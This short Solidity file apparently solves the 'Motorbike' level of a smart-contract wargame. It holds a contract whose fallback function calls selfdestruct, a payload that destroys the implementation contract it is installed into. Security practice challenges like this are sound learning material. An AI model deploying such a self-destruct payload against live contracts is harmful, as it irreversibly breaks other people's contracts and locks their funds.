// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract MotorbikeSolution {
  fallback () external {
    selfdestruct(payable(address(0)));
  }
}